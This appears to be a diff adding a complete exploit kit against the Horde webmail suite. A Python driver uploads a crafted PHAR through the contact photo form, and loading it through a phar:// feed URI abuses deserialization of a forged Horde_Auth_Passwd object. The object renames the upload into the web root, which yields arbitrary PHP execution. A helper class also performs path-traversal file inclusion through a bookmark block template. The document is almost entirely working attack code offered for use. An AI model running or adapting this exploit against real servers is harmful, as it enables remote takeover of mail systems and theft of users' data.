@@ -1,0 +1,241 @@
+## exploit-phar-loading.py
+#!/usr/bin/env python3
+from horde import Horde
+import requests
+import subprocess
+import sys
+
+TEMP_DIR = '/tmp'
+WWW_ROOT = '/var/www/html'
+
+if len(sys.argv) < 5:
+    print('Usage: <base_url> <username> <password> <filename> <php_code>')
+    sys.exit(1)
+
+base_url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+filename = sys.argv[4]
+php_code = sys.argv[5]
+
+source = '{}/{}.phar'.format(TEMP_DIR, filename)
+destination = '{}/static/{}.php'.format(WWW_ROOT, filename) # destination (delete manually)
+temp = 'temp.phar'
+url = '{}/static/{}.php'.format(base_url, filename)
+
+# log into the web application
+horde = Horde(base_url, username, password)
+
+# create a PHAR that performs a rename when loaded and runs the payload when executed
+subprocess.run([
+    'php', 'create-renaming-phar.php',
+    temp, source, destination, php_code
+], stderr=subprocess.DEVNULL)
+
+# upload the PHAR
+with open(temp, 'rb') as fs:
+    phar_data = fs.read()
+    horde.upload_to_tmp('{}.phar'.format(filename), phar_data)
+
+# load the phar thus triggering the rename
+horde.trigger_phar(source)
+
+# issue a request to trigger the payload
+response = requests.get(url)
+print(response.text)
+## exploit-phar-loading.py EOF
+
+
+
+
+## create-renaming-phar.php
+#!/usr/bin/env php
+<?php
+
+// the __destruct method of Horde_Auth_Passwd eventually calls
+// rename($this->_lockfile, $this->_params['filename']) if $this->_locked
+class Horde_Auth_Passwd {
+    // visibility must match since protected members are prefixed by "\x00*\x00"
+    protected $_locked;
+    protected $_params;
+
+    function __construct($source, $destination) {
+        $this->_params = array('filename' => $destination);
+        $this->_locked = true;
+        $this->_lockfile = $source;
+    }
+};
+
+function createPhar($path, $source, $destination, $stub) {
+    // create the object and specify source and destination files
+    $object = new Horde_Auth_Passwd($source, $destination);
+
+    // create the PHAR
+    $phar = new Phar($path);
+    $phar->startBuffering();
+    $phar->addFromString('x', '');
+    $phar->setStub("<?php $stub __HALT_COMPILER();");
+    $phar->setMetadata($object);
+    $phar->stopBuffering();
+}
+
+function main() {
+    global $argc, $argv;
+
+    // check arguments
+    if ($argc != 5) {
+        fwrite(STDERR, "Usage: <path> <source> <destination> <stub>\n");
+        exit(1);
+    }
+
+    // create a fresh new phar
+    $path = $argv[1];
+    $source = $argv[2];
+    $destination = $argv[3];
+    $stub = $argv[4];
+    @unlink($path);
+    createPhar($path, $source, $destination, $stub);
+}
+
+main();
+## create-renaming-phar.php EOF
+
+
+## horde.py
+import re
+import requests
+
+class Horde():
+    def __init__(self, base_url, username, password):
+        self.base_url = base_url
+        self.username = username
+        self.password = password
+        self.session = requests.session()
+        self.token = None
+        self._login()
+
+    def _login(self):
+        url = '{}/login.php'.format(self.base_url)
+        data = {
+            'login_post': 1,
+            'horde_user': self.username,
+            'horde_pass': self.password
+        }
+        response = self.session.post(url, data=data)
+        token_match = re.search(r'"TOKEN":"([^"]+)"', response.text)
+        assert (
+            len(response.history) == 1 and
+            response.history[0].status_code == 302 and
+            response.history[0].headers['location'] == '/services/portal/' and
+            token_match
+        ), 'Cannot log in'
+        self.token = token_match.group(1)
+
+    def upload_to_tmp(self, filename, data):
+        url = '{}/turba/add.php'.format(self.base_url)
+        files = {
+            'object[photo][img][file]': (None, filename),
+            'object[photo][new]': ('x', data)
+        }
+        response = self.session.post(url, files=files)
+        assert response.status_code == 200, 'Cannot upload the file to tmp'
+
+    def include_remote_inc_file(self, path):
+        # vulnerable block (alternatively 'trean:trean_Block_Mostclicked')
+        app = 'trean:trean_Block_Bookmarks'
+
+        # add one dummy bookmark (to be sure)
+        url = '{}/trean/add.php'.format(self.base_url)
+        data = {
+            'actionID': 'add_bookmark',
+            'url': 'x'
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot add the bookmark'
+
+        # add bookmark block
+        url = '{}/services/portal/edit.php'.format(self.base_url)
+        data = {
+            'token': self.token,
+            'row': 0,
+            'col': 0,
+            'action': 'save-resume',
+            'app': app,
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot add the bookmark block'
+
+        # edit bookmark block
+        url = '{}/services/portal/edit.php'.format(self.base_url)
+        data = {
+            'token': self.token,
+            'row': 0,
+            'col': 0,
+            'action': 'save',
+            'app': app,
+            'params[template]': '../../../../../../../../../../../' + path
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot edit the bookmark block'
+
+        # evaluate the remote file
+        url = '{}/services/portal/'.format(self.base_url)
+        response = self.session.get(url)
+        print(response.text)
+
+        # remove the bookmark block so to not break the page
+        url = '{}/services/portal/edit.php'.format(self.base_url)
+        data = {
+            # XXX token not needed here
+            'row': 0,
+            'col': 0,
+            'action': 'removeBlock'
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot reset the bookmark block'
+
+    def trigger_phar(self, path):
+        # vulnerable block (alternatively the same can be obtained by creating a
+        # bookmark with the PHAR path and clocking on it)
+        app = 'horde:horde_Block_Feed'
+
+        # add syndicated feed block
+        url = '{}/services/portal/edit.php'.format(self.base_url)
+        data = {
+            'token': self.token,
+            'row': 0,
+            'col': 0,
+            'action': 'save-resume',
+            'app': app,
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot add the syndicated feed block'
+
+        # edit syndicated feed block
+        url = '{}/services/portal/edit.php'.format(self.base_url)
+        data = {
+            'token': self.token,
+            'row': 0,
+            'col': 0,
+            'action': 'save',
+            'app': app,
+            'params[uri]': 'phar://{}'.format(path)
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot edit the syndicated feed block'
+
+        # load the PHAR archive
+        url = '{}/services/portal/'.format(self.base_url)
+        response = self.session.get(url)
+
+        # remove the syndicated feed block so to not break the page
+        url = '{}/services/portal/edit.php'.format(self.base_url)
+        data = {
+            # XXX token not needed here
+            'row': 0,
+            'col': 0,
+            'action': 'removeBlock'
+        }
+        response = self.session.post(url, data=data)
+        assert response.status_code == 200, 'Cannot reset the syndicated feed block'
+## horde.py EOF
